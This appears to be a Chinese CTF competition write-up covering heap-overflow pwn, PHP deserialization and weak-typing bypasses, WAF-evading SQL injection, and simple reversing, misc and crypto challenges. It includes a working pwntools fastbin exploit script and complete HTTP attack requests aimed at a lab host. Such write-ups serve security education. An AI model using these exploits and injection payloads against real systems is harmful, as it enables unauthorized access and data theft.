# PWN

## magicheap

程序给了一个cat flag  
![](https://i.imgur.com/MOUvbrV.png)

触发条件隐藏的4869功能，当magic>0x1305时触发读flag  
![](https://i.imgur.com/cLUfKmM.png)  
接下来就是想办法让magic>0x1305

漏洞点在edit函数中，编辑内容时候，size我们可以任意，但是堆块的大小在creat的时候就已经固定，这里的size能产生堆溢出  
![](https://i.imgur.com/oNRxzqB.png)

利用magic上面的stdin，是个0x7fXXXXXXXX的地址，把0x6020ad当成伪造堆块  
![](https://i.imgur.com/SmoDsnt.png)

利用fsatbin的fd修改来实现将0x70大小的堆块分配到在这里  
![](https://i.imgur.com/UkmnBYh.png)

如果题目没有给这么个magic，没有给libc，要去shell就没这么容易了

    
    
    from pwn import *
    context.log_level = 'debug'
    #p = process('./magicheap')
    p = remote('192.168.200.200',40001)
    def new(size,content):
    	p.recvuntil('Your choice :')
    	p.sendline('1')
    	p.recvuntil('Heap : ')
    	p.sendline(str(size))
    	p.recvuntil('heap:')
    	p.sendline(content)
    	
    def edit(idx,size,content):
    	p.recvuntil('Your choice :')
    	p.sendline('2')
    	p.recvuntil('Index :')
    	p.sendline(str(idx))
    	p.recvuntil('Heap : ')
    	p.sendline(str(size))
    	p.recvuntil('heap : ')
    	p.sendline(content)
    
    def free(idx):
    	p.recvuntil('Your choice :')
    	p.sendline('3')
    	p.recvuntil('Index :')
    	p.sendline(str(idx))
    
    new(0x60,'a'*0x5f)
    new(0x60,'a'*0x5f)
    new(0x60,'a'*0x5f)
    new(0x60,'a'*0x5f)
    new(0x60,'a'*0x5f)
    new(0x60,'a'*0x5f)
    free(1)
    free(2)
    edit(0,0x200,'a'*0x60 + p64(0) + p64(0x71) + 'a'*0x60 + p64(0) + p64(0x71) + p64(0x6020ad))
    new(0x60,'a'*0x5f)
    new(0x60,'a'*0x5f)
    
    #gdb.attach(p)
    
    p.interactive()
    

## win逆向

简单的读取，比较

![](https://i.imgur.com/2cNPGZY.png)

![](https://i.imgur.com/lFLf8vS.png)

大概就是，你的输入input，程序内置byte_415768,内置一个数组v9  
前17有input[i] = byte_415768[v9[i]],再后面几位是 1024} 就可以了  
这个提取随便写下，但是当时没注意这个17，v9数组有22全提了再加 1024}，后来队友提醒。

# WEB

## theuserisadmin

源代码

    
    
    <!--    $user = $_GET["user"];
    $file = $_GET["file"];
    $pass = $_GET["pass"];
    
    if(isset($user)&&(file_get_contents($user,'r')==="the user is admin")){
        echo "hello admin!<br>";
        include($file); //class.php
    }else{
        echo "you are not admin ! ";
    }
     -->
    

通过php伪协议读文件  
index.php

    
    
    <?php
    $user = $_GET["user"];
    $file = $_GET["file"];
    $pass = $_GET["pass"];
    
    if(isset($user)&&(file_get_contents($user,'r')==="the user is admin")){
        echo "hello admin!<br>";
        if(preg_match("/f1a9/",$file)){
            exit();
        }else{
            include($file); //class.php
            $pass = unserialize($pass);
            echo $pass;
        }
    }else{
        echo "you are not admin ! ";
    }
    
    ?>
    
    <!--    $user = $_GET["user"];
    $file = $_GET["file"];
    $pass = $_GET["pass"];
    
    if(isset($user)&&(file_get_contents($user,'r')==="the user is admin")){
        echo "hello admin!<br>";
        include($file); //class.php
    }else{
        echo "you are not admin ! ";
    }
     -->
    

class.php

    
    
    <?php
    
    class Read{//f1a9.php
        public $file;
        public function __toString(){
            if(isset($this->file)){
                echo file_get_contents($this->file);    
            }
            return "__toString was called!";
        }
    }
    ?>
    

最后payload

    
    
    POST /web/theuserisadmin/?user=php://input&file=class.php&pass=O%3A4%3A%22Read%22%3A1%3A%7Bs%3A4%3A%22file%22%3Bs%3A8%3A%22f1a9.php%22%3B%7D HTTP/1.1
    Host: 192.168.200.200
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 17
    
    the user is admin
    

## waf

扫描一波文件 `www.zip` ok, 代码审计了

function.php

    
    
    function filtering($str) {
        $check= eregi('select|insert|update|delete|\'|\/\*|\*|\.\.\/|\.\/|union|into|load_file|outfile', $str);
        if($check)
            {
            echo "非法字符!";
            exit();
        }
        .....
    }
    

eregi 使用 `%00`过掉

content.php 里面直接拼接给的参数

    
    
    <?php
    include './global.php';
    extract($_REQUEST);
    
    $sql = "select * from test.content where id=$message_id";
    

payload

    
    
    POST /web/waf/content.php HTTP/1.1
    Host: 192.168.200.200
    Connection: close
    Content-Type: multipart/form-data; boundary=--------2049511993
    Content-Length: 138
    
    ----------2049511993
    Content-Disposition: form-data; name="message_id"
    
    "%00" union select 1,2,flag,4 from flag
    ----------2049511993--    

## codeaudit

`.svn` 泄露

    
    
    <?php
    error_reporting(0);
    
    $user = $_COOKIE['user'];
    $code = $_GET['code']?(int)$_GET['code']:'';
    if($user == 'admin' && !empty($code)) {
    	
    	$hex = (int)$code;
    	
    	if(($hex ^ 6789) === 0xCDEF) {
    		require("flag.php");
    		echo $flag;
    		exit();
    	}
    	
    }
    
    echo "ȱ��Ӧ�еĲ���,��û��Ȩ�޲鿴������";
    
    ?>
    

很简单  
payload

    
    
    GET /web/codeaudit/?code=55146 HTTP/1.1
    Host: 192.168.200.200
    Cookie: user=admin
    Connection: close
    
    

## base lanauage

直接给源码

    
    
    <?php 
    show_source(__FILE__); 
    $a=0; 
    $b=0; 
    $c=0; 
    $d=0; 
    if (isset($_GET['x1'])) 
    { 
            $x1 = $_GET['x1']; 
            $x1=="1"?die("ha?"):NULL; 
            switch ($x1) 
            { 
            case 0: 
            case 1: 
                    $a=1; 
                    break; 
            } 
    } 
    $x2=(array)json_decode(@$_GET['x2']); 
    if(is_array($x2)){ 
        is_numeric(@$x2["x21"])?die("ha?"):NULL; 
        if(@$x2["x21"]){ 
            ($x2["x21"]>2017)?$b=1:NULL; 
        } 
        if(is_array(@$x2["x22"])){ 
            if(count($x2["x22"])!==2 OR !is_array($x2["x22"][0])) die("ha?"); 
            $p = array_search("XIPU", $x2["x22"]); 
            $p===false?die("ha?"):NULL; 
            foreach($x2["x22"] as $key=>$val){ 
                $val==="XIPU"?die("ha?"):NULL; 
            } 
            $c=1; 
    } 
    } 
    $x3 = $_GET['x3']; 
    if ($x3 != '15562') { 
        if (strstr($x3, 'XIPU')) { 
            if (substr(md5($x3),8,16) == substr(md5('15562'),8,16)) { 
                $d=1; 
            } 
        } 
    } 
    if($a && $b && $c && $d){ 
        include "flag.php"; 
        echo $flag; 
    } 
    ?>
    

php 弱类型 和 array_search 比较的问题  
下面的md5

    
    
    $ php -R "echo substr(md5('15562'),8,16);"
    
    0e46379442318098
    

是0e[0-9] 在php中数字比较会变成0  
所以找到另一个也是这样的格式的md5串就好了

    
    
    import hashlib
    import re
    i = 0
    reg = re.compile('.{8}0e[0-9]{14}.{8}')
    while True:
        s = 'XIPU' + str(i)
        md5 = hashlib.md5()
        md5.update(s.encode('ascii'))
        if reg.match(md5.hexdigest()):
            print(md5.hexdigest(), s)
            break
        i = i + 1
    

payload

    
    
    GET /web/bestlanguage/?x1=true&x2={"x21":"2018a","x22":[[],true]}&x3=XIPU18570 HTTP/1.1
    Host: 192.168.200.200
    Connection: close
    
    
    

# MISC

## reverseMe

打开文件发现有  
`swodniW( 6SC pohsotohP ebodA`

    
    
    with open('reverseMe.txt') as f:
        data = f.read()
        with open('output.png', 'wb') as f:
            f.write(data[::-1])
    

得到这个图片  
![](https://i.imgur.com/fHqHBxo.png)

## 流量审计

关键词 `theflag` 二分法爆破  
耐心一条一条分析就ok  
`52c6f1d6`

# crypto

## brightstar

    
    
    snkeegt fhstetr Iedsabs tnaktrt otessha iiriwis tethees
    
    key： howarey
    
    Columnar Transposition Cipher
    

提示 `Columnar Transposition Cipher`  
key 和 `ctf-wiki` 里面的例子一样.直接手动解析  
`Itisofteninthedarkestskipsthatweseebrighteststars`

## 这是啥呀

打开 解base32

    
    
    >>> import base64
    >>> base64.b32decode('MZWGCZ33MM4GENJVHBRDSNJUGAYTSOBVGZTDAYRQGIZTINLEMMZTSNJVHBRX2===')
    b'flag{c8b558b954019856f0b02345dc39558c}'
    >>>

 **注：解题报告由获得特等奖的 福州大学SIOR战队 **（指导老师：何萧玲）** 提供**

 **  
**

 **更多赛题解析，请关注海峡信息后续报道~~~**

 **  
![安全客媒体平台-封面图_副本.jpg](https://image.3001.net/images/20180925/1537859507_5ba9dfb3b1cbc.jpg!small)**

 **  
**

 **  
**

